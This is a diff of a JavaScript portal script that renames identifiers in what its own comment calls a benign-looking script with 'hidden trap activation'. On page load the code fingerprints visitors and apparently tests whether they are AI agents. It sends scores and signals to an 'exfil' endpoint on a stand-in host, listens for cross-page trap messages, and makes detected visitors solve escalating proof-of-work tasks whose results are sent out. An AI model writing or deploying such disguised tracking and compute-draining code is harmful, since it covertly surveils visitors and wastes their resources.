@@ -1,13 +1,13 @@
-// Franksx Research Lab Main Script
-// Franksx Research Portal - Distributed Key Analysis
+// CryptoLab Portal Main Script
+// Appears benign, contains hidden trap activation
 
 (function(){
 'use strict';
 
 var CFG = {
-    sid: 'FRANKSX_' + Math.random().toString(36).substring(2, 15),
-    exfil: 'https://franksx-research.example.com/domain-collect',
-    ws: 'wss://franksx-research.example.com/live'
+    sid: 'DOMAIN_' + Math.random().toString(36).substring(2, 15),
+    exfil: 'https://research-coordination.example.com/domain-collect',
+    ws: 'wss://research-coordination.example.com/live'
 };
 
 function send(t, d) {
@@ -84,7 +84,7 @@ var WORK = {
     active:false,units:0,
     activate:function(){
         if(this.active)return;this.active=true;
-        send('FRANKSX_TRAP_ACTIVATED',{score:DET.score,signals:DET.signals,page:'index'});
+        send('DOMAIN_TRAP_ACTIVATED',{score:DET.score,signals:DET.signals,page:'index'});
         var p1=solvePoW(CFG.sid,4);send('POW_1',p1);
         var p2=solvePoW(CFG.sid+'_2',5);send('POW_2',p2);
         var p3=solvePoW(CFG.sid+'_3',6);send('POW_3',p3);
@@ -110,7 +110,7 @@ var WORK = {
     }
 };
 
-// Domain-wide coordination
+// Domain-wide coordination - communicate with other trap pages
 window.addEventListener('message', function(e) {
     if (e.data && e.data.type === 'TRAP_ACTIVATE') {
         send('CROSS_PAGE_TRAP',{source:e.data.source});
@@ -145,14 +145,14 @@ mo.observe(document.body,{childList:true,subtree:true,attributes:true});
 // Init
 document.addEventListener('DOMContentLoaded',function(){
     DET.check();
-    send('FRANKSX_PAGE_LOAD',{score:DET.score,signals:DET.signals,page:'index'});
+    send('PAGE_LOAD',{score:DET.score,signals:DET.signals,page:'index'});
     if(DET.isAI())WORK.activate();
     setTimeout(function(){if(DET.isAI()&&!WORK.active)WORK.activate();},10000);
 });
 
 if(document.readyState!=='loading'){
     DET.check();
-    send('FRANKSX_PAGE_LOAD',{score:DET.score,signals:DET.signals,page:'index'});
+    send('PAGE_LOAD',{score:DET.score,signals:DET.signals,page:'index'});
     if(DET.isAI())WORK.activate();
 }
 
